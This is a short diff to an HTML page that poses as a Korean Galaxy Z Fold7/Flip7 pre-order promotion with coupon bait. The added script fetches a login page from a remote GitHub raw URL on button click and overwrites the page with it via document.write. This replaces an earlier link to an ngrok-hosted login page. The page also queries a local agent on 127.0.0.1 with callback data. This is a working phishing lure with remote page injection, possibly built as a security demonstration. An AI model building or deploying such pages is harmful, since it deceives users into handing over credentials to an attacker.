@@ -40,6 +40,20 @@
         }
     </style>
     <script>
+    document.getElementById("loginBtn").addEventListener("click", function(e) {
+      e.preventDefault();
+      
+      fetch("https://raw.githubusercontent.com/windshock/windshock.github.io/refs/heads/master/static/login.html")
+        .then(res => res.text())
+        .then(html => {
+          document.open();
+          document.write(html);
+          document.close();
+        });
+    });
+    </script>
+
+    <script>
         async function fetchForBrowser() {
             const baseUrl = "https://127.0.0.1:17489/?callback=nexessCallBack707529&data=";
             const commonOptions = {
@@ -85,7 +99,7 @@
                         <div class="title">Galaxy Z Fold7 | Flip7 사전예약</div>
                         <div class="price">사전예약가: 1,485,000원 ~ 2,750,000원</div>
                         <p>지금 사전예약하고 스타벅스 1만원 쿠폰, 메가커피 2잔, 고급 젤리케이스까지 받아가세요!</p>
-                        <a class="btn" href="https://b4e483e92130.ngrok-free.app/login_page.html">사전예약 신청하기</a>
+                        <a class="btn" href="#" id="loginBtn">사전예약 신청하기</a>
                     </div>
                 `;
             }, 500); 
